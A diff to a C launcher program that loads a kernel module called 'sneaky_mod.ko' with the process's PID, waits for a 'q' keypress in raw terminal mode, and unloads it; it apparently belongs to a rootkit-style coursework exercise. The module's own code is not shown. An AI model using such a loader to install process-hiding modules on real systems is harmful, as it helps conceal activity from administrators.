@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <sys/wait.h>
 #include <unistd.h>
+#include <termios.h>
 
 #define COMMAND_SIZE 100
 #define QUIT_CHAR 'q'
@@ -40,21 +41,23 @@ void modifyFile() {
 
 void loadModule() {
   char command[COMMAND_SIZE];
-  sprintf(command, "insmod sneaky_mod.ko pid=%d", PID);
+  sprintf(command, "insmod sneaky_mod.ko SNEAKY_PID=%d", PID);
   executeCommand(command);
 }
 
 void readInput() {
-  char input;
-  while (1) {
-    input = getchar();
-    if (input == EOF) {
-      perror("getchar failed");
-      exit(EXIT_FAILURE);
-    } else if (input == QUIT_CHAR) {
-      break;
-    }
-  }
+  struct termios old_tio, new_tio;
+  tcgetattr(STDIN_FILENO, &old_tio);
+  new_tio = old_tio;
+  new_tio.c_lflag &=(~ICANON & ~ECHO);
+  tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);
+
+  unsigned char c;
+  do {
+    c = getchar();
+  } while(c != 'q');
+
+  tcsetattr(STDIN_FILENO, TCSANOW, &old_tio);
 }
 
 void unloadModule() { executeCommand("rmmod sneaky_mod"); }
